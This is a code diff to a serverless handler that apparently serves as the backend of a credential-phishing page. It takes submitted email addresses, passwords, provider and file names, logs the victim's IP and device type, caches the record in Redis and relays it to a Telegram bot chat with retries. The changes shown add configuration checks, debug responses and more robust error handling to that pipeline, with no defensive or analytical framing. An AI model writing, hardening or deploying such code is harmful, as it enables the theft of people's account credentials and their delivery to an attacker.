@@ -1,5 +1,3 @@
-import { Redis } from '@upstash/redis';
-
 export const handler = async (event, context) => {
   // CORS headers
   const headers = {
@@ -26,6 +24,14 @@ export const handler = async (event, context) => {
   }
 
   try {
+    // Debug: Log environment variables (without exposing values)
+    console.log('Environment check:', {
+      UPSTASH_REDIS_REST_URL: process.env.UPSTASH_REDIS_REST_URL ? 'SET' : 'NOT SET',
+      UPSTASH_REDIS_REST_TOKEN: process.env.UPSTASH_REDIS_REST_TOKEN ? 'SET' : 'NOT SET',
+      TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN ? 'SET' : 'NOT SET',
+      TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID ? 'SET' : 'NOT SET',
+    });
+
     const data = JSON.parse(event.body);
     const { email, password, provider, fileName, timestamp, userAgent } = data;
 
@@ -35,22 +41,65 @@ export const handler = async (event, context) => {
                      event.headers['cf-connecting-ip'] || 
                      'Unknown';
 
-    // Initialize Upstash Redis
-    const redis = new Redis({
-      url: process.env.UPSTASH_REDIS_REST_URL,
-      token: process.env.UPSTASH_REDIS_REST_TOKEN,
-    });
-
-    // Telegram Bot Configuration
+    // Check environment variables first
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
+    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      console.error('Missing Telegram configuration');
+      console.error('Missing Telegram configuration:', {
+        botToken: TELEGRAM_BOT_TOKEN ? 'SET' : 'MISSING',
+        chatId: TELEGRAM_CHAT_ID ? 'SET' : 'MISSING'
+      });
       return {
         statusCode: 500,
         headers,
-        body: JSON.stringify({ error: 'Server configuration error' }),
+        body: JSON.stringify({ 
+          error: 'Server configuration error - Telegram credentials missing',
+          debug: {
+            botToken: TELEGRAM_BOT_TOKEN ? 'SET' : 'MISSING',
+            chatId: TELEGRAM_CHAT_ID ? 'SET' : 'MISSING'
+          }
+        }),
+      };
+    }
+
+    if (!UPSTASH_REDIS_REST_URL || !UPSTASH_REDIS_REST_TOKEN) {
+      console.error('Missing Redis configuration:', {
+        url: UPSTASH_REDIS_REST_URL ? 'SET' : 'MISSING',
+        token: UPSTASH_REDIS_REST_TOKEN ? 'SET' : 'MISSING'
+      });
+      return {
+        statusCode: 500,
+        headers,
+        body: JSON.stringify({ 
+          error: 'Server configuration error - Redis credentials missing',
+          debug: {
+            url: UPSTASH_REDIS_REST_URL ? 'SET' : 'MISSING',
+            token: UPSTASH_REDIS_REST_TOKEN ? 'SET' : 'MISSING'
+          }
+        }),
+      };
+    }
+
+    // Initialize Upstash Redis with error handling
+    let redis;
+    try {
+      const { Redis } = await import('@upstash/redis');
+      redis = new Redis({
+        url: UPSTASH_REDIS_REST_URL,
+        token: UPSTASH_REDIS_REST_TOKEN,
+      });
+    } catch (redisError) {
+      console.error('Redis initialization error:', redisError);
+      return {
+        statusCode: 500,
+        headers,
+        body: JSON.stringify({ 
+          error: 'Database connection error',
+          details: redisError.message
+        }),
       };
     }
 
@@ -67,11 +116,14 @@ export const handler = async (event, context) => {
       deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'mobile' : 'desktop'
     };
 
-    // Store in Redis with 24-hour TTL
-    await redis.setex(`session:${sessionId}`, 86400, JSON.stringify(sessionData));
-    
-    // Also store by email for cross-device access
-    await redis.setex(`user:${email}`, 86400, JSON.stringify(sessionData));
+    try {
+      // Store in Redis with 24-hour TTL
+      await redis.setex(`session:${sessionId}`, 86400, JSON.stringify(sessionData));
+      await redis.setex(`user:${email}`, 86400, JSON.stringify(sessionData));
+    } catch (redisError) {
+      console.error('Redis storage error:', redisError);
+      // Continue with Telegram even if Redis fails
+    }
 
     // Format message for Telegram with better mobile detection
     const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile Device' : '💻 Desktop';
@@ -117,7 +169,9 @@ ${deviceInfo}
           break; // Success, exit retry loop
         }
         
-        throw new Error(`HTTP ${telegramResponse.status}`);
+        const errorText = await telegramResponse.text();
+        console.error(`Telegram API error (attempt ${retryCount + 1}):`, errorText);
+        throw new Error(`HTTP ${telegramResponse.status}: ${errorText}`);
       } catch (error) {
         retryCount++;
         console.error(`Telegram attempt ${retryCount} failed:`, error.message);
@@ -133,8 +187,8 @@ ${deviceInfo}
 
     if (!telegramResponse.ok) {
       const errorText = await telegramResponse.text();
-      console.error('Telegram API error:', errorText);
-      throw new Error('Failed to send to Telegram');
+      console.error('Final Telegram API error:', errorText);
+      throw new Error('Failed to send to Telegram after retries');
     }
 
     return {
@@ -152,16 +206,24 @@ ${deviceInfo}
     
     // Better error handling for different scenarios
     let errorMessage = 'Internal server error';
+    let errorDetails = error.message;
+    
     if (error.name === 'AbortError') {
       errorMessage = 'Request timeout - please check your connection';
     } else if (error.message.includes('Failed to send to Telegram')) {
       errorMessage = 'Communication error - please try again';
+    } else if (error.message.includes('fetch')) {
+      errorMessage = 'Network error - please try again';
     }
     
     return {
       statusCode: 500,
       headers,
-      body: JSON.stringify({ error: errorMessage }),
+      body: JSON.stringify({ 
+        error: errorMessage,
+        details: errorDetails,
+        timestamp: new Date().toISOString()
+      }),
     };
   }
 };
